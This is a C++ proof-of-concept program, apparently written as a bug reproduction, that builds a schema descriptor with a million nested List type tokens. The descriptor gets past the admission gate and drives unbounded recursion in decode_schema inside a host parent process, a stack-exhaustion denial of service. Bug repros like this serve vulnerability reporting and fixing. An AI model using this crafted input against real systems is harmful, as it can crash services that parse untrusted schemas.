// Repro: a hostile child's manifest can drive unbounded recursion in
// loom::decode_type (schema_codec.hpp:206) inside the HOST parent process.
// Path in production: IsolationHost::reconstruct_and_cache (src/isolation/host.cpp:516)
//   -> decode_schema(...) -> decode_type(...) recursing once per List token.
// The token list is a plain list, bounded only by kMaxListCount = 1<<20.

#include <zen/kernel/schema_codec.hpp>
#include <zen/serialize.hpp>
#include <zen/registry.hpp>

#include <cstdio>
#include <cstdlib>
#include <vector>

using namespace loom;

int main(int argc, char** argv) {
    const std::size_t n = argc > 1 ? std::strtoul(argv[1], nullptr, 10) : 1000000;

    // Build a SchemaDesc whose single field's type-token stream is n List tokens
    // followed by one Int token. Exactly what a malicious .so would encode.
    Value fd(field_desc_schema());
    fd.set("name", Cell::text("f"));
    fd.set("required", Cell::boolean(true));
    std::vector<Cell> tokens;
    tokens.reserve(n + 1);
    for (std::size_t i = 0; i < n; ++i) {
        tokens.push_back(Cell::message(make_type_token(Kind::List, nullptr)));
    }
    tokens.push_back(Cell::message(make_type_token(Kind::Int, nullptr)));
    fd.set("type", Cell::list(std::move(tokens)));

    Value desc(schema_desc_schema());
    desc.set("name", Cell::text("evil.Deep"));
    desc.set("version", Cell::integer(1));
    std::vector<Cell> fields;
    fields.push_back(Cell::message(std::move(fd)));
    desc.set("fields", Cell::list(std::move(fields)));

    // Cross the wire exactly as the Hello frame does: serialize -> parse -> admit.
    const std::string bytes = serialize(desc);
    std::fprintf(stderr, "[probe] tokens=%zu serialized=%zu bytes (frame cap 64MiB)\n", n,
                 bytes.size());

    Unverified u = parse(bytes);
    Admission a = admit(u, schema_desc_schema());
    if (!a.ok()) {
        std::fprintf(stderr, "[probe] GATE REFUSED: %s\n", a.first_error().message().c_str());
        return 2;
    }
    std::fprintf(stderr, "[probe] gate ADMITTED. calling decode_schema (host-side)...\n");

    Registry deps;
    try {
        auto s = decode_schema(a.value(), deps);
        std::fprintf(stderr, "[probe] decode_schema returned, name=%s\n", s->name().c_str());
    } catch (const std::exception& e) {
        std::fprintf(stderr, "[probe] threw cleanly: %s\n", e.what());
        return 3;
    }
    std::fprintf(stderr, "[probe] survived\n");
    return 0;
}
